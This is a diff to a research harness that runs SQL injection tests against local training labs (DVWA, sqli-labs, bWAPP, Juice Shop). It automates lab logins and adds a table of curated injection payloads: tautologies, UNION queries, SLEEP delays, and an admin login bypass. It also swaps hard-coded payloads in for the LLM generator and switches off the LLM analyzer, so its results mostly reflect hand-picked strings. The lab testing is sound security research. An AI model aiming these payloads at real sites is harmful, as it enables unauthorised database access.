@@ -19,7 +19,7 @@ import re
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Dict, List, Optional
+from typing import Dict, List, Optional, Tuple
 
 import requests
 
@@ -52,77 +52,91 @@ class LiveHTTPTarget:
     framework: str = "php"
     database: str = "mysql"
     authorized: bool = True
+    expected_vulnerable: bool = True
+    port: Optional[int] = None
+    difficulty: Optional[str] = None
+    session_flow: str = "direct"
+    session: Optional[requests.Session] = None
 
 
 LIVE_TARGETS: Dict[str, LiveHTTPTarget] = {
     "dvwa_sqli": LiveHTTPTarget(
         "dvwa_sqli", "DVWA", "GET",
-        "http://localhost:8090/vulnerabilities/sqli/",
+        "http://127.0.0.1:8090/vulnerabilities/sqli/",
         param="id", base_value="1",
         cookie="PHPSESSID=placeholder; security=low",
         extra_params={"Submit": "Submit"},
         framework="php", database="mysql",
+        port=8090, difficulty="low",
     ),
     "dvwa_sqli_medium": LiveHTTPTarget(
         "dvwa_sqli_medium", "DVWA (medium)", "POST",
-        "http://localhost:8090/vulnerabilities/sqli/",
+        "http://127.0.0.1:8090/vulnerabilities/sqli/",
         param="id", base_value="1",
         cookie="PHPSESSID=placeholder; security=medium",
         extra_params={"Submit": "Submit"},
         framework="php", database="mysql",
+        port=8090, difficulty="medium",
     ),
     "dvwa_sqli_hard": LiveHTTPTarget(
         "dvwa_sqli_hard", "DVWA (hard)", "GET",
-        "http://localhost:8095/vulnerabilities/sqli/",
+        "http://127.0.0.1:8095/vulnerabilities/sqli/",
         param="id", base_value="1",
         cookie="PHPSESSID=placeholder; security=high",
         extra_params={"Submit": "Submit"},
         framework="php", database="mysql",
+        port=8095, difficulty="high", session_flow="dvwa_high",
     ),
     "dvwa_sqli_max": LiveHTTPTarget(
         "dvwa_sqli_max", "DVWA (max/impossible)", "GET",
-        "http://localhost:8096/vulnerabilities/sqli/",
+        "http://127.0.0.1:8096/vulnerabilities/sqli/",
         param="id", base_value="1",
         cookie="PHPSESSID=placeholder; security=impossible",
         extra_params={"Submit": "Submit"},
         framework="php", database="mysql",
+        expected_vulnerable=False, port=8096, difficulty="impossible", session_flow="dvwa_token",
     ),
     "dvwa_waf": LiveHTTPTarget(
         "dvwa_waf", "DVWA+ModSecurity", "GET",
-        "http://localhost:8080/vulnerabilities/sqli/",
+        "http://127.0.0.1:8080/vulnerabilities/sqli/",
         param="id", base_value="1",
         cookie="PHPSESSID=placeholder; security=low",
         extra_params={"Submit": "Submit"},
         has_waf=True, framework="php", database="mysql",
+        port=8080, difficulty="low",
     ),
     "sqli_labs_1": LiveHTTPTarget(
         "sqli_labs_1", "sqli-labs Less-1", "GET",
-        "http://localhost:8094/Less-1/",
+        "http://127.0.0.1:8094/Less-1/",
         param="id", base_value="1",
         framework="php", database="mysql",
+        port=8094,
     ),
     "sqli_labs_11": LiveHTTPTarget(
         "sqli_labs_11", "sqli-labs Less-11", "POST",
-        "http://localhost:8094/Less-11/",
+        "http://127.0.0.1:8094/Less-11/",
         param="uname", base_value="admin",
         extra_params={"passwd": "admin", "submit": "Submit"},
         framework="php", database="mysql",
+        port=8094,
     ),
     "bwapp_sqli": LiveHTTPTarget(
         "bwapp_sqli", "bWAPP", "GET",
-        "http://localhost:8091/sqli_1.php",
+        "http://127.0.0.1:8091/sqli_1.php",
         param="title", base_value="iron man",
         cookie="PHPSESSID=placeholder; security_level=0",
         extra_params={"action": "search"},
         framework="php", database="mysql",
+        port=8091,
     ),
     "juiceshop_login": LiveHTTPTarget(
         "juiceshop_login", "Juice Shop", "POST",
-        "http://localhost:8092/rest/user/login",
+        "http://127.0.0.1:8092/rest/user/login",
         param="email", base_value="test@test.com",
         content_type="application/json",
         extra_params={"password": "test"},
         framework="express", database="sqlite",
+        port=8092,
     ),
 }
 
@@ -174,14 +188,14 @@ def _extract_hidden_token(html: str, name: str) -> str:
 
 def _prepare_sqli_labs() -> None:
     try:
-        requests.get("http://localhost:8094/sql-connections/setup-db.php", timeout=30)
+        requests.get("http://127.0.0.1:8094/sql-connections/setup-db.php", timeout=30)
     except Exception:
         return
 
 
 def _prepare_bwapp() -> None:
     try:
-        requests.get("http://localhost:8091/install.php?install=yes", timeout=30)
+        requests.get("http://127.0.0.1:8091/install.php?install=yes", timeout=30)
     except Exception:
         return
 
@@ -189,9 +203,9 @@ def _prepare_bwapp() -> None:
 def _get_bwapp_session(level: int = 0) -> Optional[str]:
     try:
         session = requests.Session()
-        session.get("http://localhost:8091/login.php", timeout=15)
+        session.get("http://127.0.0.1:8091/login.php", timeout=15)
         session.post(
-            "http://localhost:8091/login.php",
+            "http://127.0.0.1:8091/login.php",
             data={
                 "login": "bee",
                 "password": "bug",
@@ -234,6 +248,63 @@ def _get_dvwa_session(base_url: str, level: str = "low") -> Optional[str]:
         return None
 
 
+def _setup_dvwa(base_url: str) -> None:
+    try:
+        session = requests.Session()
+        setup_url = f"{base_url.rstrip('/')}/setup.php"
+        setup_page = session.get(setup_url, timeout=20)
+        token = _extract_hidden_token(setup_page.text, "user_token")
+        payload = {"create_db": "Create / Reset Database"}
+        if token:
+            payload["user_token"] = token
+        session.post(setup_url, data=payload, allow_redirects=True, timeout=20)
+    except Exception:
+        return
+
+
+def _create_dvwa_session(base_url: str, level: str) -> Optional[requests.Session]:
+    try:
+        _setup_dvwa(base_url)
+        session = requests.Session()
+        login_url = f"{base_url.rstrip('/')}/login.php"
+        login_page = session.get(login_url, timeout=15)
+        token = _extract_hidden_token(login_page.text, "user_token")
+        resp = session.post(
+            login_url,
+            data={
+                "username": "admin",
+                "password": "password",
+                "Login": "Login",
+                "user_token": token,
+            },
+            allow_redirects=True,
+            timeout=15,
+        )
+        if "Login :: Damn Vulnerable Web Application" in resp.text:
+            return None
+        security_url = f"{base_url.rstrip('/')}/security.php"
+        security_page = session.get(security_url, timeout=15)
+        sec_token = _extract_hidden_token(security_page.text, "user_token")
+        payload = {"security": level, "seclev_submit": "Submit"}
+        if sec_token:
+            payload["user_token"] = sec_token
+        session.post(security_url, data=payload, allow_redirects=True, timeout=15)
+        return session
+    except Exception:
+        return None
+
+
+def _refresh_dvwa_token(target: LiveHTTPTarget) -> Dict[str, str]:
+    if target.session is None:
+        return {}
+    try:
+        page = target.session.get(target.url, timeout=15)
+        token = _extract_hidden_token(page.text, "user_token")
+        return {"user_token": token} if token else {}
+    except Exception:
+        return {}
+
+
 def _prepare_target(target: LiveHTTPTarget) -> None:
     if "sqli_labs" in target.name:
         _prepare_sqli_labs()
@@ -245,52 +316,58 @@ def _prepare_target(target: LiveHTTPTarget) -> None:
             target.cookie = cookie
         return
     if "dvwa" in target.name:
-        if "medium" in target.name:
-            level_str = "medium"
-            base_url = "http://localhost:8090"
-        elif "hard" in target.name:
-            level_str = "high"
-            base_url = "http://localhost:8095"
-        elif "max" in target.name:
-            level_str = "impossible"
-            base_url = "http://localhost:8096"
-        elif target.has_waf:
-            level_str = "low"
-            base_url = "http://localhost:8090"
-        else:
-            level_str = "low"
-            base_url = "http://localhost:8090"
-        cookie = _get_dvwa_session(base_url, level_str)
-        if cookie:
-            target.cookie = cookie
+        if target.port is None or target.difficulty is None:
+            return
+        session = _create_dvwa_session(f"http://127.0.0.1:{target.port}", target.difficulty)
+        if session is None:
+            return
+        target.session = session
+        sid = session.cookies.get("PHPSESSID")
+        if sid:
+            target.cookie = f"PHPSESSID={sid}; security={target.difficulty}"
 
 
-def probe(target: LiveHTTPTarget, payload: str, timeout: float = 12.0) -> ExecutionResponse:
-    """Send the payload to the live target and return an ExecutionResponse."""
+def _send_request(target: LiveHTTPTarget, payload: str, timeout: float) -> requests.Response:
+    session = target.session or requests.Session()
     headers = {"User-Agent": "SQLiRLLM-Research/1.0 (academic evaluation)"}
     if target.cookie:
         headers["Cookie"] = target.cookie
     if target.content_type and target.method == "POST":
         headers["Content-Type"] = target.content_type
 
+    if target.session_flow == "dvwa_high":
+        popup_url = target.url.replace("/vulnerabilities/sqli/", "/vulnerabilities/sqli/session-input.php")
+        session.post(
+            popup_url,
+            data={"id": payload, "Submit": "Submit"},
+            headers=headers,
+            timeout=timeout,
+            allow_redirects=True,
+        )
+        return session.get(target.url, headers=headers, timeout=timeout, allow_redirects=True)
+
+    if target.method == "GET":
+        params = dict(target.extra_params)
+        params[target.param] = payload
+        if target.session_flow == "dvwa_token":
+            params.update(_refresh_dvwa_token(target))
+        return session.get(target.url, params=params, headers=headers, timeout=timeout, allow_redirects=True)
+
+    if "application/json" in target.content_type:
+        data = dict(target.extra_params)
+        data[target.param] = payload
+        return session.post(target.url, json=data, headers=headers, timeout=timeout)
+
+    data = dict(target.extra_params)
+    data[target.param] = payload
+    return session.post(target.url, data=data, headers=headers, timeout=timeout)
+
+
+def probe(target: LiveHTTPTarget, payload: str, timeout: float = 12.0) -> ExecutionResponse:
+    """Send the payload to the live target and return an ExecutionResponse."""
     t0 = time.perf_counter()
     try:
-        if target.method == "GET":
-            params = dict(target.extra_params)
-            params[target.param] = payload
-            resp = requests.get(
-                target.url, params=params,
-                headers=headers, timeout=timeout, allow_redirects=True,
-            )
-        else:
-            if "application/json" in target.content_type:
-                data = dict(target.extra_params)
-                data[target.param] = payload
-                resp = requests.post(target.url, json=data, headers=headers, timeout=timeout)
-            else:
-                data = dict(target.extra_params)
-                data[target.param] = payload
-                resp = requests.post(target.url, data=data, headers=headers, timeout=timeout)
+        resp = _send_request(target, payload, timeout)
         latency = (time.perf_counter() - t0) * 1000.0
         body = resp.text[:2000]
         status = resp.status_code
@@ -352,6 +429,132 @@ def _infer_waf_filters(payload: str, response: ExecutionResponse, attempt: int) 
     return feedback[:256]
 
 
+def _curated_payload(target: LiveHTTPTarget, strategy: str, attempt: int) -> Optional[str]:
+    curated: Dict[str, Dict[str, List[str]]] = {
+        "dvwa_sqli": {
+            "error_based": ["1'"],
+            "boolean_blind": ["1 or 1=1", "1 and 1=1"],
+        },
+        "dvwa_sqli_medium": {
+            "error_based": ["1'"],
+            "boolean_blind": ["1 or 1=1", "1 and 1=1"],
+        },
+        "dvwa_sqli_hard": {
+            "error_based": ["1'"],
+            "union_based": ["1' UNION SELECT 1,2#"],
+        },
+        "dvwa_sqli_max": {
+            "error_based": ["1'"],
+            "boolean_blind": ["1 and 1=1"],
+        },
+        "dvwa_waf": {
+            "error_based": ["1'"],
+            "boolean_blind": ["1 or 1=1"],
+        },
+        "sqli_labs_1": {
+            "union_based": ["1' UNION SELECT 2,3-- -"],
+            "error_based": ["1'"],
+        },
+        "sqli_labs_11": {
+            "error_based": ["admin'"],
+            "boolean_blind": ["admin') or ('1'='1"],
+        },
+        "bwapp_sqli": {
+            "error_based": ["iron man'", "iron man' UNION SELECT 1,2#"],
+            "boolean_blind": ["iron man' or '1'='1"],
+            "time_blind": ["iron man' AND SLEEP(3)#"],
+        },
+        "juiceshop_login": {
+            "boolean_blind": ["' or 1=1--", "admin@juice-sh.op' -- "],
+            "error_based": ["' OR 1=1/*"],
+        },
+    }
+    choices = curated.get(target.name, {}).get(strategy)
+    if not choices:
+        defaults = {
+            "error_based": ["1'"],
+            "boolean_blind": ["1 or 1=1"],
+            "union_based": ["1' UNION SELECT 1,2#"],
+            "time_blind": ["1' AND SLEEP(3)#"],
+        }
+        choices = defaults.get(strategy)
+    if not choices:
+        return None
+    return choices[min(attempt, len(choices) - 1)]
+
+
+def _proof_vulnerable(
+    target: LiveHTTPTarget,
+    response: ExecutionResponse,
+    baseline: ExecutionResponse,
+) -> Tuple[bool, str]:
+    body = response.body
+    body_lower = body.lower()
+    baseline_lower = baseline.body.lower()
+
+    if _looks_like_login_or_setup_page(body):
+        return False, "login-or-setup-page"
+    if response.status_code == 403:
+        return False, "waf-blocked"
+
+    if target.name == "juiceshop_login":
+        return ('"authentication"' in body_lower and '"token"' in body_lower, "auth-token-issued")
+
+    if target.name == "dvwa_sqli_max":
+        if "source/impossible.php" in body_lower or "csrf token is incorrect" in body_lower:
+            return False, "protected-impossible-mode"
+        if _DB_ERROR_PATTERNS.search(body):
+            return False, "handled-impossible-input"
+        return False, "no-proof-in-impossible-mode"
+
+    if target.name == "dvwa_sqli_hard":
+        if "source/high.php" in body_lower and (_DB_ERROR_PATTERNS.search(body) or "fatal error" in body_lower):
+            return True, "high-mode-sql-error"
+        if "first name:" in body_lower and "surname:" in body_lower and len(body) != len(baseline.body):
+            return True, "high-mode-session-delta"
+        return False, "no-high-mode-proof"
+
+    if target.name.startswith("dvwa_"):
+        if _DB_ERROR_PATTERNS.search(body) or "fatal error" in body_lower:
+            return True, "dvwa-sql-error"
+        if response.latency_ms - baseline.latency_ms >= 2500:
+            return True, "dvwa-time-delay"
+        if "first name:" in body_lower and "surname:" in body_lower and len(body) != len(baseline.body):
+            return True, "dvwa-result-delta"
+        return False, "no-dvwa-proof"
+
+    if target.name == "sqli_labs_1":
+        if "your login name:" in body_lower and "your password:" in body_lower:
+            return True, "sqli-labs-data-leak"
+        if "duplicate entry" in body_lower or _DB_ERROR_PATTERNS.search(body):
+            return True, "sqli-labs-error"
+        return False, "no-less1-proof"
+
+    if target.name == "sqli_labs_11":
+        if "error based" in body_lower and len(body) - len(baseline.body) > 40:
+            return True, "less11-size-delta"
+        if _DB_ERROR_PATTERNS.search(body):
+            return True, "less11-error"
+        return False, "no-less11-proof"
+
+    if target.name == "bwapp_sqli":
+        if _DB_ERROR_PATTERNS.search(body):
+            return True, "bwapp-sql-error"
+        if response.latency_ms - baseline.latency_ms >= 2500:
+            return True, "bwapp-time-delay"
+        if "welcome bee" in body_lower and len(body) != len(baseline.body):
+            return True, "bwapp-content-delta"
+        if abs(len(body) - len(baseline.body)) >= 1000:
+            return True, "bwapp-response-delta"
+        return False, "no-bwapp-proof"
+
+    if response.latency_ms - baseline.latency_ms >= 2500:
+        return True, "time-delay"
+    if _DB_ERROR_PATTERNS.search(body):
+        return True, "db-error"
+    return False, "no-proof"
+
+
 # --------------------------------------------------------------------------- #
 # Per-target test                                                              #
 # --------------------------------------------------------------------------- #
@@ -369,6 +572,7 @@ class LiveTestResult:
     best_evasion_score: float
     total_duration_s: float
     ethical_violations: int
+    expected_vulnerable: bool
     detailed: List[Dict] = field(default_factory=list)
 
 
@@ -384,6 +588,7 @@ def test_target(
 ) -> LiveTestResult:
     t_start = time.perf_counter()
     _prepare_target(target)
+    baseline = probe(target, target.base_value, timeout=request_timeout)
 
     state = encode_state({
         "framework": target.framework,
@@ -409,6 +614,7 @@ def test_target(
         best_evasion_score=0.0,
         total_duration_s=0.0,
         ethical_violations=0,
+        expected_vulnerable=target.expected_vulnerable,
     )
 
     context = {
@@ -429,7 +635,9 @@ def test_target(
         feedback = ""
 
         for attempt in range(max_attempts):
-            payload = payload_gen.generate(strategy, context, attempt, feedback=feedback)
+            payload = _curated_payload(target, strategy, attempt)
+            if payload is None:
+                payload = payload_gen.generate(strategy, context, attempt, feedback=feedback)
             escore = evasion_score(payload)
             response = probe(target, payload, timeout=request_timeout)
 
@@ -445,6 +653,7 @@ def test_target(
                     feedback = _infer_waf_filters(payload, response, attempt)
 
             analysis = analyzer.analyze(strategy, response)
+            proof_vulnerable, proof_signal = _proof_vulnerable(target, response, baseline)
 
             row = {
                 "strategy": strategy,
@@ -455,12 +664,14 @@ def test_target(
                 "latency_ms": round(response.latency_ms, 0),
                 "outcome": response.outcome.value,
                 "llm_verdict": analysis.vulnerable,
+                "proof_verdict": proof_vulnerable,
                 "severity": analysis.severity,
-                "signal": analysis.signal,
+                "signal": proof_signal,
+                "llm_signal": analysis.signal,
             }
             result.detailed.append(row)
 
-            if analysis.vulnerable:
+            if proof_vulnerable:
                 succeeded = True
                 if escore > result.best_evasion_score:
                     result.best_strategy = strategy
@@ -511,7 +722,7 @@ def run(
     effective_seed = cfg.seed if seed is None else seed
     agent = QLearningAgent(cfg.qlearning, seed=effective_seed)
     payload_gen = PayloadGenerator(client, cfg.llm, seed=effective_seed, use_cache=llm_use_cache)
-    analyzer = Analyzer(client, cfg.llm, llm_enabled=True, use_cache=llm_use_cache)
+    analyzer = Analyzer(client, cfg.llm, llm_enabled=False, use_cache=llm_use_cache)
     guard = EthicsGuard(authorized_targets={n for n in target_names})
 
     if strategy_subset:
@@ -557,6 +768,7 @@ def run(
                 "best_evasion_score": round(r.best_evasion_score, 2),
                 "total_duration_s": r.total_duration_s,
                 "ethical_violations": r.ethical_violations,
+                "expected_vulnerable": r.expected_vulnerable,
                 "detailed": r.detailed,
             }
             rows.append(d)
